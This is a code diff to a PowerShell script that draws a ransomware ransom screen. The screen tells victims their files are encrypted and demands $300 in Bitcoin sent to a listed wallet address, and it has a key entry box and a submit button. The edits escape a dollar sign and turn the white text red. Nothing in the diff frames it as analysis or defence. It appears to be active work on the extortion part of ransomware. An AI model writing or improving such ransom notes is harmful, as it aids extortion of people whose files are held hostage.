@@ -34,7 +34,7 @@ User: $username@$hostname
 To decrypt your files, you must purchase the private key.
 
 Instructions:
-1. Send $300 worth of Bitcoin to this address:
+1. Send \$300 worth of Bitcoin to this address:
    1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX
 
 2. Send your Bitcoin wallet ID and the following installation key to:
@@ -52,7 +52,7 @@ $body = New-Object Windows.Forms.TextBox
 $body.Multiline = $true
 $body.ReadOnly = $true
 $body.BackColor = 'Black'
-$body.ForeColor = 'White'
+$body.ForeColor = 'Red'
 $body.Font = New-Object Drawing.Font("Consolas", $bodyFontSize)
 $body.Text = $instructions
 $body.Dock = 'Fill'
@@ -66,7 +66,7 @@ $inputPanel.BackColor = 'Black'
 
 $keyLabel = New-Object Windows.Forms.Label
 $keyLabel.Text = "Key:"
-$keyLabel.ForeColor = 'White'
+$keyLabel.ForeColor = 'Red'
 $keyLabel.Font = New-Object Drawing.Font("Consolas", $inputFontSize)
 $keyLabel.AutoSize = $true
 $keyLabel.Location = New-Object Drawing.Point(20, [int]($inputPanel.Height/2 - $inputFontSize))
@@ -75,7 +75,7 @@ $keyBox = New-Object Windows.Forms.TextBox
 $keyBox.Width = [int]($screenWidth * 0.3)
 $keyBox.Font = New-Object Drawing.Font("Consolas", $inputFontSize)
 $keyBox.Location = New-Object Drawing.Point(80, [int]($inputPanel.Height/2 - $inputFontSize))
-$keyBox.ForeColor = 'White'
+$keyBox.ForeColor = 'Red'
 $keyBox.BackColor = 'Black'
 
 $submit = New-Object Windows.Forms.Button
